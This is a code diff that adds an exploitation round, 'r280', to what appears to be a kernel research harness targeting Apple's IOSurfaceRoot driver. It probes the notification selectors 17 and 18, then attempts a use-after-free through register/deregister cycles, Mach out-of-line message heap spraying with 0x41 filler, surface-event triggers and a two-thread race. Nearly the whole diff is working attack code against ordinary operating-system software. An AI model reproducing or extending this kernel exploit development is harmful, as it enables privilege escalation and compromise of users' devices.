@@ -1745,6 +1745,273 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r280: sel17/18 notification semantics + surface-triggered UAF.
+ * r279: sel17/sel18 work, 0 anomalies, BUT only 1 registry spray succeeded.
+ * The first field of the 24-byte input may be the surface ID.
+ * Notifications fire on surface events, not immediately.
+ * This round:
+ * Part 1: Determine what fields 0,1,2 of the 24-byte input mean
+ * Part 2: Register for a specific surface, deregister, spray, modify surface
+ * Part 3: Multi-threaded register/deregister/trigger race */
+struct r280_race_ctx {
+    io_connect_t conn;
+    uint32_t surf_id;
+    volatile int *stop;
+    volatile uint64_t *reg_ok;
+    volatile uint64_t *reg_fail;
+    volatile uint64_t *dereg_ok;
+    volatile uint64_t *dereg_fail;
+};
+
+static void *r280_reg_fn(void *arg) {
+    struct r280_race_ctx *c = arg;
+    while (!*c->stop) {
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t ref = 0x3333;
+        uint64_t inp[3] = {c->surf_id, 0, 0};
+        kern_return_t kr = IOConnectCallAsyncMethod(c->conn, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(c->reg_ok, 1);
+        else __sync_fetch_and_add(c->reg_fail, 1);
+        mach_port_deallocate(mach_task_self(), wp);
+    }
+    return NULL;
+}
+
+static void *r280_dereg_fn(void *arg) {
+    struct r280_race_ctx *c = arg;
+    while (!*c->stop) {
+        uint64_t inp[3] = {c->surf_id, 0, 0};
+        kern_return_t kr = IOConnectCallMethod(c->conn, 18, NULL, 0,
+            inp, 24, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(c->dereg_ok, 1);
+        else __sync_fetch_and_add(c->dereg_fail, 1);
+    }
+    return NULL;
+}
+
+static void r280_probe(void) {
+    rlog("\n=== r280: sel17/18 Notification Semantics + Surface-Triggered UAF ===\n");
+    fflush(stdout);
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    rlog("  svc=%u conn=%u (kr=0x%x)\n", svc, conn, kr);
+
+    CFMutableDictionaryRef tp = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int tw=64,th=64,tbpe=4,tbpr=64*4,tpf=0x42475241,tas=64*64*4;
+    CFNumberRef twn=CFNumberCreate(NULL,kCFNumberIntType,&tw);
+    CFNumberRef thn=CFNumberCreate(NULL,kCFNumberIntType,&th);
+    CFNumberRef tbn=CFNumberCreate(NULL,kCFNumberIntType,&tbpe);
+    CFNumberRef trn=CFNumberCreate(NULL,kCFNumberIntType,&tbpr);
+    CFNumberRef tpn=CFNumberCreate(NULL,kCFNumberIntType,&tpf);
+    CFNumberRef tan=CFNumberCreate(NULL,kCFNumberIntType,&tas);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceWidth"),twn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceHeight"),thn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceBytesPerElement"),tbn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceBytesPerRow"),trn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfacePixelFormat"),tpn);
+    CFDictionarySetValue(tp,CFSTR("IOSurfaceAllocSize"),tan);
+    CFRelease(twn);CFRelease(thn);CFRelease(tbn);CFRelease(trn);CFRelease(tpn);CFRelease(tan);
+    IOSurfaceRef test_surf = IOSurfaceCreate(tp);
+    uint32_t sid = IOSurfaceGetID(test_surf);
+    rlog("  test surface id=%u\n", sid);
+
+    /* Part 1: What do the 3 input fields mean? */
+    rlog("\n--- Part 1: Input field semantics ---\n");
+    {
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t ref = 0x1111;
+
+        /* Test 1a: field0=surfID, field1=0, field2=0 */
+        uint64_t inp[3] = {sid, 0, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        rlog("  sel17({surfID=%u,0,0}): 0x%x\n", sid, kr);
+        if (kr == 0) {
+            kern_return_t kd = IOConnectCallMethod(conn, 18, NULL, 0,
+                inp, 24, NULL, NULL, NULL, NULL);
+            rlog("  sel18 deregister: 0x%x\n", kd);
+        }
+
+        /* Test 1b: Register with same input again (DupReg test) */
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        rlog("  sel17({surfID,0,0}) re-register: 0x%x\n", kr);
+        /* Don't deregister — test 1c registers with different field0 */
+
+        /* Test 1c: Register with different field0 while 1b is active */
+        uint64_t inp2[3] = {sid + 100, 0, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp2, 24, NULL, NULL, NULL, NULL);
+        rlog("  sel17({%u,0,0}) second registration: 0x%x\n", sid+100, kr);
+
+        /* Test 1d: Register with field0=0 */
+        uint64_t inp3[3] = {0, 0, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp3, 24, NULL, NULL, NULL, NULL);
+        rlog("  sel17({0,0,0}): 0x%x\n", kr);
+
+        /* Test 1e: Register with field0=1 (like r279) */
+        uint64_t inp4[3] = {1, 0, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp4, 24, NULL, NULL, NULL, NULL);
+        rlog("  sel17({1,0,0}): 0x%x\n", kr);
+
+        /* Test 1f: Different field1 values */
+        uint64_t inp5[3] = {sid, 1, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp5, 24, NULL, NULL, NULL, NULL);
+        rlog("  sel17({surfID,1,0}): 0x%x\n", kr);
+
+        uint64_t inp6[3] = {sid, 0, 1};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp6, 24, NULL, NULL, NULL, NULL);
+        rlog("  sel17({surfID,0,1}): 0x%x\n", kr);
+
+        /* Deregister everything */
+        IOConnectCallMethod(conn, 18, NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        IOConnectCallMethod(conn, 18, NULL, 0, inp2, 24, NULL, NULL, NULL, NULL);
+        IOConnectCallMethod(conn, 18, NULL, 0, inp3, 24, NULL, NULL, NULL, NULL);
+        IOConnectCallMethod(conn, 18, NULL, 0, inp4, 24, NULL, NULL, NULL, NULL);
+        IOConnectCallMethod(conn, 18, NULL, 0, inp5, 24, NULL, NULL, NULL, NULL);
+        IOConnectCallMethod(conn, 18, NULL, 0, inp6, 24, NULL, NULL, NULL, NULL);
+
+        mach_port_deallocate(mach_task_self(), wp);
+        fflush(stdout);
+    }
+
+    /* Part 2: Register for surface, deregister, spray, then modify surface */
+    rlog("\n--- Part 2: Register/deregister/spray/trigger (10 attempts) ---\n");
+    {
+        IOServiceClose(conn);
+        for (int attempt = 0; attempt < 10; attempt++) {
+            io_connect_t rc = 0;
+            IOServiceOpen(svc, mach_task_self(), 0, &rc);
+            if (!rc) continue;
+
+            mach_port_t wp = MACH_PORT_NULL;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+            mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+            uint64_t ref = 0x2222 + attempt;
+            uint64_t inp[3] = {sid, 0, 0};
+
+            /* Register notification for our surface */
+            kern_return_t rr = IOConnectCallAsyncMethod(rc, 17, wp, &ref, 1,
+                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+
+            /* Immediately deregister (frees the notification entry) */
+            kern_return_t rd = IOConnectCallMethod(rc, 18, NULL, 0,
+                inp, 24, NULL, NULL, NULL, NULL);
+
+            rlog("  attempt %d: reg=0x%x dereg=0x%x\n", attempt+1, rr, rd);
+
+            /* Spray OOL messages to fill freed slot */
+            mach_port_t spray_port;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_port);
+            mach_port_insert_right(mach_task_self(), spray_port, spray_port, MACH_MSG_TYPE_MAKE_SEND);
+            mach_port_limits_t lim = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
+            mach_port_set_attributes(mach_task_self(), spray_port,
+                MACH_PORT_LIMITS_INFO, (mach_port_info_t)&lim,
+                MACH_PORT_LIMITS_INFO_COUNT);
+
+            struct {
+                mach_msg_header_t hdr;
+                mach_msg_body_t body;
+                mach_msg_ool_descriptor_t ool;
+            } msg;
+            uint8_t spray_data[64];
+            memset(spray_data, 0x41, sizeof(spray_data));
+            uint64_t fake = 0x4141414141414141ULL;
+            for (int j = 0; j < 64; j += 8) memcpy(&spray_data[j], &fake, 8);
+
+            int sprayed = 0;
+            for (int j = 0; j < 500; j++) {
+                msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_remote_port = spray_port;
+                msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                msg.hdr.msgh_id = 0x41414141;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.address = spray_data;
+                msg.ool.size = sizeof(spray_data);
+                msg.ool.deallocate = 0;
+                msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+                kern_return_t mkr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                    sizeof(msg), 0, MACH_PORT_NULL, 1, MACH_PORT_NULL);
+                if (mkr == 0) sprayed++;
+            }
+
+            /* Trigger: modify the surface to fire notifications */
+            IOSurfaceSetValue(test_surf, CFSTR("trigger"), CFSTR("fire"));
+            IOSurfaceLock(test_surf, 0, NULL);
+            IOSurfaceUnlock(test_surf, 0, NULL);
+            IOSurfaceRemoveValue(test_surf, CFSTR("trigger"));
+
+            /* Check wake port for notifications */
+            struct {
+                mach_msg_header_t hdr;
+                uint8_t body[256];
+            } recv_msg;
+            kern_return_t recv_kr = mach_msg(&recv_msg.hdr,
+                MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(recv_msg),
+                wp, 10, MACH_PORT_NULL);
+            rlog("  spray=%d recv=0x%x\n", sprayed, recv_kr);
+
+            if (recv_kr == 0) {
+                rlog("  *** GOT NOTIFICATION! id=0x%x size=%u ***\n",
+                     recv_msg.hdr.msgh_id, recv_msg.hdr.msgh_size);
+            }
+
+            mach_port_destroy(mach_task_self(), spray_port);
+            mach_port_deallocate(mach_task_self(), wp);
+            IOServiceClose(rc);
+        }
+        fflush(stdout);
+    }
+
+    /* Part 3: Multi-threaded race — register on one thread, deregister on another */
+    rlog("\n--- Part 3: Multi-threaded register/deregister (5s) ---\n");
+    {
+        io_connect_t rc = 0;
+        IOServiceOpen(svc, mach_task_self(), 0, &rc);
+
+        volatile int stop = 0;
+        volatile uint64_t reg_ok = 0, reg_fail = 0, dereg_ok = 0, dereg_fail = 0;
+
+        struct r280_race_ctx r280_ctx = { rc, sid, &stop, &reg_ok, &reg_fail, &dereg_ok, &dereg_fail };
+
+        pthread_t t_reg, t_dereg;
+        pthread_create(&t_reg, NULL, r280_reg_fn, &r280_ctx);
+        pthread_create(&t_dereg, NULL, r280_dereg_fn, &r280_ctx);
+
+        sleep(5);
+        stop = 1;
+        pthread_join(t_reg, NULL);
+        pthread_join(t_dereg, NULL);
+
+        rlog("  reg_ok=%llu reg_fail=%llu dereg_ok=%llu dereg_fail=%llu\n",
+             reg_ok, reg_fail, dereg_ok, dereg_fail);
+
+        IOServiceClose(rc);
+        fflush(stdout);
+    }
+
+    CFRelease(test_surf);
+    CFRelease(tp);
+    IOObjectRelease(svc);
+    rlog("\n*** r280 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r279: Aggressive sel17/18 async register/deregister race.
  * Earlier r206 code had the right mechanism but only 50 iterations.
  * sel17 = IOConnectCallAsyncMethod(conn,17,wp,ref,1,NULL,0,inp,24,...) — async register
@@ -25136,6 +25403,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 280) {
+            rlog("*** rounds=280: sel17/18 Notification Semantics + Surface-Triggered UAF ***\n");
+            rlog("  r279: sel17/18 work, 0 anomalies, only 1 spray reg. Need surface trigger.\n");
+            rlog("  Testing: input field semantics, surface-bound notifications, multi-threaded race.\n\n");
+            fflush(stdout);
+            r280_probe();
             goto done;
         }
         if (rounds == 279) {
